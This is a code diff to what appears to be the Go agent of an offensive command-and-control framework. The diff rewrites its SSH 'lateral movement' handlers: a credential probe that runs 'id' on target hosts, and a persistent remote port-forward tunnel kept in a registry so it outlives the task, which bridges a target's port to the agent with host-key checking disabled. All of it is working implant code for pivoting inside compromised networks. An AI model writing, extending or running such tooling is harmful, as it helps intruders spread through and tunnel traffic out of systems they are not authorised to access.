@@ -5,14 +5,16 @@ package main
 import (
 	"bytes"
 	"fmt"
+	"io"
 	"net"
 	"os"
 	"path/filepath"
+	"strconv"
 	"strings"
+	"sync"
 	"time"
 
 	"golang.org/x/crypto/ssh"
-	"golang.org/x/crypto/ssh/knownhosts"
 )
 
 // SSH connection result
@@ -278,7 +280,7 @@ func trySSHConnect(host string, port int, cred SSHCredential, command string) SS
 	return result
 }
 
-// SSH lateral movement host resolution via knownhosts
+// SSH credential probe for lateral movement
 func handleSSHKeygenImpl(task Task, res *TaskResult) {
 	params := strings.SplitN(task.Command, " ", 2)
 	if len(params) < 1 {
@@ -292,18 +294,16 @@ func handleSSHKeygenImpl(task Task, res *TaskResult) {
 		user = params[1]
 	}
 
-	_, err := knownhosts.New("")
-	if err != nil {
-		_ = err // knownhosts not required for our use
-	}
-
 	result := trySSHConnect(host, 22, SSHCredential{User: user}, "id")
 	res.Output = fmt.Sprintf("SSH key scan result for %s@%s:\nSuccess: %t\n%s", user, host, result.Success, result.Output)
+	if !result.Success {
+		res.Error = result.Error
+	}
 }
 
-// SSH port forwarding (local → remote)
+// handleSSHTunnelImpl drives the remote port forward task.
+// Format: "host:remote_port:local_port [user]"
 func handleSSHTunnelImpl(task Task, res *TaskResult) {
-	// Format: "host:remote_port:local_port [user]"
 	parts := strings.Fields(task.Command)
 	if len(parts) < 1 {
 		res.Error = "usage: ssh_tunnel host:remote_port:local_port [user]"
@@ -322,11 +322,57 @@ func handleSSHTunnelImpl(task Task, res *TaskResult) {
 		return
 	}
 
-	host := colonParts[0]
-	remotePort := colonParts[1]
-	localPort := colonParts[2]
+	msg, err := startSSHTunnel(colonParts[0], colonParts[1], colonParts[2], user)
+	if err != nil {
+		res.Error = err.Error()
+		return
+	}
+	res.Output = msg
+}
 
-	addr := fmt.Sprintf("%s:22", host)
+// ── SSH remote port forward ───────────────────────────────────────────────────
+// `ssh_tunnel host:remote_port:local_port [user]` opens an SSH connection to
+// the target and forwards the target's remote_port (listening on the SSH
+// server) to 127.0.0.1:local_port on this agent. The tunnel is managed in a
+// registry so it stays alive after the task handler returns — it is torn down
+// only when the SSH connection itself dies.
+
+var (
+	sshTunMu   sync.Mutex
+	sshTunnels = map[string]*sshTunnel{}
+)
+
+type sshTunnel struct {
+	host       string
+	remotePort string
+	localPort  string
+	user       string
+	client     *ssh.Client
+	listener   net.Listener
+	closed     bool
+}
+
+func (t *sshTunnel) key() string { return net.JoinHostPort(t.host, t.remotePort) }
+
+// startSSHTunnel dials the target and registers a live remote port forward.
+// Returns an honest status message once the listener is actually bound.
+func startSSHTunnel(host, remotePort, localPort, user string) (string, error) {
+	if _, err := strconv.Atoi(remotePort); err != nil {
+		return "", fmt.Errorf("invalid remote_port %q", remotePort)
+	}
+	if _, err := strconv.Atoi(localPort); err != nil {
+		return "", fmt.Errorf("invalid local_port %q", localPort)
+	}
+
+	key := net.JoinHostPort(host, remotePort)
+	sshTunMu.Lock()
+	if t, ok := sshTunnels[key]; ok && !t.closed {
+		sshTunMu.Unlock()
+		return "", fmt.Errorf("ssh tunnel already active on %s", key)
+	}
+	sshTunMu.Unlock()
+
+	addr := net.JoinHostPort(host, "22")
 	config := &ssh.ClientConfig{
 		User:            user,
 		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
@@ -336,51 +382,77 @@ func handleSSHTunnelImpl(task Task, res *TaskResult) {
 
 	client, err := ssh.Dial("tcp", addr, config)
 	if err != nil {
-		res.Error = fmt.Sprintf("SSH dial error: %v", err)
-		return
+		return "", fmt.Errorf("SSH dial error: %v", err)
 	}
-	defer client.Close()
-
-	listener, err := client.Listen("tcp", fmt.Sprintf("127.0.0.1:%s", remotePort))
+	listener, err := client.Listen("tcp", net.JoinHostPort("127.0.0.1", remotePort))
 	if err != nil {
-		res.Error = fmt.Sprintf("SSH listen error: %v", err)
-		return
+		client.Close()
+		return "", fmt.Errorf("SSH listen error: %v", err)
 	}
-	defer listener.Close()
 
-	res.Output = fmt.Sprintf("SSH tunnel established: localhost:%s → %s:%s via %s@%s", localPort, host, remotePort, user, host)
+	t := &sshTunnel{
+		host:       host,
+		remotePort: remotePort,
+		localPort:  localPort,
+		user:       user,
+		client:     client,
+		listener:   listener,
+	}
+	sshTunMu.Lock()
+	if prev, ok := sshTunnels[key]; ok && !prev.closed {
+		sshTunMu.Unlock()
+		listener.Close()
+		client.Close()
+		return "", fmt.Errorf("ssh tunnel already active on %s", key)
+	}
+	sshTunnels[key] = t
+	sshTunMu.Unlock()
 
-	// Accept connections in background
-	go func() {
-		for {
-			localConn, err := listener.Accept()
-			if err != nil {
-				return
-			}
-			go func() {
-				defer localConn.Close()
-				remoteConn, err := net.DialTimeout("tcp", fmt.Sprintf("127.0.0.1:%s", localPort), 5*time.Second)
-				if err != nil {
-					return
-				}
-				defer remoteConn.Close()
-				transferData(localConn, remoteConn)
-			}()
-		}
-	}()
+	go t.acceptLoop()
+
+	return fmt.Sprintf("SSH tunnel active: %s:%s → 127.0.0.1:%s (via %s@%s)", host, remotePort, localPort, user, host), nil
 }
 
-func transferData(dst, src net.Conn) {
-	buf := make([]byte, 4096)
+func (t *sshTunnel) acceptLoop() {
 	for {
-		n, err := src.Read(buf)
+		conn, err := t.listener.Accept()
 		if err != nil {
-			break
+			t.teardown()
+			return
 		}
-		if _, err := dst.Write(buf[:n]); err != nil {
-			break
-		}
+		go t.bridge(conn)
 	}
+}
+
+// bridge pipes one forwarded connection to the agent-side local service and
+// back, both directions.
+func (t *sshTunnel) bridge(in net.Conn) {
+	defer in.Close()
+	out, err := net.DialTimeout("tcp", net.JoinHostPort("127.0.0.1", t.localPort), 5*time.Second)
+	if err != nil {
+		return
+	}
+	defer out.Close()
+	done := make(chan struct{}, 2)
+	copyDir := func(dst, src net.Conn) {
+		_, _ = io.Copy(dst, src)
+		done <- struct{}{}
+	}
+	go copyDir(in, out)
+	go copyDir(out, in)
+	<-done
+}
+
+// teardown unregisters the tunnel and closes its SSH client and listener.
+func (t *sshTunnel) teardown() {
+	sshTunMu.Lock()
+	if !t.closed {
+		t.closed = true
+		delete(sshTunnels, t.key())
+	}
+	sshTunMu.Unlock()
+	_ = t.listener.Close()
+	t.client.Close()
 }
 
 // SSH file upload via SCP
